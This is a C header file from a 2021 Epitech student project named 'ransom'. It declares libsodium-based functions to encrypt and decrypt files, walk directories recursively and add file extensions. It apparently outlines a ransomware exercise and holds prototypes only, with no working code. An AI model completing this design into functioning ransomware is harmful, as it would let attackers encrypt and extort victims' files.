/*
** EPITECH PROJECT, 2021
** RANSOM_H_
** File description:
** ransom
*/


#ifndef RANSOM_H_
#define RANSOM_H_

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sodium.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <stdbool.h>
#include <sodium.h>
#include <sodium/crypto_pwhash.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_FILEPATH 256
#define MAX_KEY_LEN crypto_secretstream_xchacha20poly1305_KEYBYTES
#define SALT_LEN crypto_pwhash_SALTBYTES
#define CHUNK_SIZE 4096


// encrypt.c
int decrypt_file(const char filepath[MAX_FILEPATH],
    const char optfilepath[MAX_FILEPATH], const char *password);
int encrypt_file(const char filepath[MAX_FILEPATH],
    const char optfilepath[MAX_FILEPATH], const char password[MAX_KEY_LEN]);

// ransom.c
int iter_recursively_through_files(char *path, char *password,
    int (*action)(const char *, const char *, const char *));
void get_new_path_name(char *parentPath, char *finalPath, char *currentPath);
void add_file_extension(char *fileName, char *optFileName);

#endif /* RANSOM_H_ */
